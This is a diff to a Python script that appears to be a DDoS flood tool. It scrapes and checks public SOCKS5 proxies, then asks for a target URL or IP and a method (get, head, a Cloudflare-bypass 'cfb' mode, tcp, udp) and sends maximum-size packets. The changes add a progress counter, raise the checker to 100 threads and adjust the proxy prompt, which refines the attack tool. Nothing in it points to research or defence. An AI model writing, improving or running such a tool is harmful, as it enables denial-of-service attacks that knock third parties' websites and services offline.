@@ -12,7 +12,7 @@ from colorama import Fore, Style, init
 init()
 
 def download_proxies():
-    print("Downloading proxies...")
+    print("Downloading public proxies...")
     urls = [
         "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
         "https://api.proxyscrape.com/?request=getproxies&proxytype=socks5&timeout=10000&country=all",
@@ -58,16 +58,20 @@ def check_proxies():
     print("Checking proxies...")
     checked_proxies = []
     proxy_count = len(proxy_list)
+    checked_count = 0
 
     def check_proxy_thread(start, end):
-        nonlocal checked_proxies
+        nonlocal checked_proxies, checked_count
 
         for i in range(start, end):
             proxy = proxy_list[i]
             if check_proxy(proxy):
                 checked_proxies.append(proxy)
+            checked_count += 1
+            sys.stdout.write(f"\rChecking proxies: {checked_count}/{proxy_count}")
+            sys.stdout.flush()
 
-    num_threads = 64
+    num_threads = 100
     chunk_size = proxy_count // num_threads
 
     threads = []
@@ -82,7 +86,10 @@ def check_proxies():
     for thread in threads:
         thread.join()
 
-    print("\nProxy checking done.")
+    working_proxies_count = len(checked_proxies)
+    non_working_proxies_count = proxy_count - working_proxies_count
+    print(f"\nProxies successfully checked. Working proxies: {working_proxies_count}/{proxy_count}. Non-working proxies: {non_working_proxies_count}/{proxy_count}")
+
     with open("proxies.txt", "w") as proxy_file:
         proxy_file.write("\n".join(checked_proxies))
 
@@ -103,6 +110,9 @@ method = args.method
 if not method:
     method = input("Choose the method to use (get, head, cfb, tcp, udp): ")
 
+url = None
+ip = None
+port = None
 if method in ["get", "head", "cfb"]:
     url = input("Enter the website URL (including http or https): ")
 elif method in ["tcp", "udp"]:
@@ -119,7 +129,7 @@ def ask_for_proxies():
     while use_proxies not in ["y", "n"]:
         use_proxies = input("Do you want to use proxies? (y/n): ").lower()
 
-if not method:
+if method != "cfb":
     ask_for_proxies()
 
 packet_size = 65507 if method == "udp" else 65535
@@ -195,7 +205,7 @@ def send_request(client):
         elif method == "head":
             response = client.head(url)
     except Exception as e:
-        pass  # Suppress error messages
+        pass
 
 def send_packet(client):
     try:
